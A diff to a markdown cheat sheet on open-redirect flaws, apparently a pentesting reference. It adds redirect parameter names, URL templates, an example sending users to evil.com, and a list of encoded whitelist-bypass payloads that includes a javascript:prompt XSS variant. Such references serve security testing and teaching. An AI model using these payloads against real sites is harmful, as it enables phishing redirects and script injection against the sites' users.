@@ -21,6 +21,7 @@ redir
 redirect_uri
 redirect_url
 redirect
+redirectUrl
 r
 view
 loginto
@@ -31,11 +32,28 @@ return_to
 continue
 return_path
 path
+/out?{payload}
+?view={payload}
+/login?to={payload}
 ```
 3. Example/Exploitation
 ```
 - /logout/google.com
+- /signup?redirectUrl=https://evil.com
 ```
 4. Bypass Method
+```
+//google.com
+https:google.com
+%2f%2fgoogle.com
+\/\/google.com/
+/\/google.com/
+//google%E3%80%82com   (Bypass . char)
+//google%00.com
+?next=whitelisted.com&next=google.com
+http://www.theirsite.com@yoursite.com/
+http://www.yoursite.com?http://www.theirsite.com/
+/redirect.php?url=javascript:prompt(1)    (xss from open redirection)
+```
 5. Mitigation
 6. References
